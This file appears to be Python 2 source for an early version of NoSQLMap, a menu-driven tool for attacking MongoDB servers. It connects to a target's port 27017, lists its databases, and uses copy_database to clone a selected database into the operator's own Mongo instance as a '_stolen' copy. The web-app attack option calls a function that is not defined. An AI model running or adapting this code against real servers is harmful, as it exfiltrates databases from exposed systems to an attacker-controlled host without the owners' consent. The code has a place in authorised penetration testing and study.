#!/usr/bin/python

import sys
import os
import socket
import pymongo
import subprocess



def mainMenu():
	select = True
	while select:
		os.system('clear')
		print "NoSQLMap v0.01-by Russell Butturini(tcstool@gmail.com)"
		print "\n"
		print "1-Set options (do this first)"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Exit"

		select = raw_input("Select an option:")

		if select == "1":
			options()

		elif select == "2":
			netAttacks(host)
		
		elif select == "3":
			webApps()

		elif select == "4":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	global host
	global uri
	global httpMethod
	global myIP

	select = True
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP"
		print "2-Set URI Path"
		print "3-Set HTTP Request Method (GET/POST)"
		print "4-Set my local Mongo IP"
		print "5-Set shell listener port (Not implemented)"
		print "6-Back to main menu"

		select = raw_input("Select an option:")
		
		if select == "1":
			host = raw_input("Enter the host IP/DNS name: ")
			print "Target set to " + host + "\n"
			options()

		elif select == "2":
			uri = raw_input("Enter URI Path:")
			print "URI Path set to " + uri + "\n"
			options()

		elif select == "3":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					options()

				elif httpMethod == "2":
					print "POST request set"
					options()
				else:
					print "Invalid selection"

		elif select == "4":
			myIP = raw_input("Enter host IP for my Mongo: ")
			print "Shell IP set to " + myIP + "\n"
			options()
		
		elif select == "5":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			options()
			
		elif select == "6":
			mainMenu()

def netAttacks(target):
	mgtOpen = False
	webOpen = False
	global dbList
	
	try:
		conn = pymongo.MongoClient(target,27017)
		print "MongoDB port open on " + target + ":27017!"
		mgtOpen = True
	
	except:
		print "MongoDB port closed."
	
	if mgtOpen == True:

		print "Server Info:"
		serverInfo = conn.server_info()
		print serverInfo

		print "\n"

		print "List of databases:"
		dbList = conn.database_names()
		print "\n".join(dbList)

		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
	
	raw_input("Press enter to continue...")
		
		
def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
	
	
		

	try:
		myDBConn = pymongo.MongoClient(myDB,27017)
		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",host)	
		cloneAnother = raw_input("Database cloned.  Copy another?")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			mainMenu()
	
	except:
		print "Something went wrong.  Are you sure your MongoDB is running?"
		stealDBs(myDB)								
	
mainMenu()
